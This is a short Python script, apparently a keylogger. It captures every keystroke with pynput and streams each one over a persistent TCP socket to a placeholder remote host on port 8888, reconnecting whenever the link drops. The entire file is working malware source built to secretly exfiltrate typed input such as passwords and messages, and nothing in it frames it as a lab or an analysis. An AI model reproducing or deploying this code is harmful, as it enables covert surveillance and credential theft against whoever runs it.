from pynput import keyboard
import socket
import time

def connect_to_host():
	server_address = ("<HOST IP>", 8888)
	while True:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.connect(server_address)
			break
		except socket.error:
			time.sleep(3)
	return sock

sock = connect_to_host()

def on_press(key):
	global sock
	try:
		pressed_key = key.char
	except AttributeError:
		if key == keyboard.Key.enter:
			pressed_key = "\n"
		elif key == keyboard.Key.space:
			pressed_key = " "
		else:
			pressed_key = f"\n[{key}]\n"
	try:
		sock.send(pressed_key.encode())
	except socket.error:
		sock = connect_to_host()


with keyboard.Listener(on_press=on_press) as logger:
	logger.join()

if sock:
	sock.close()
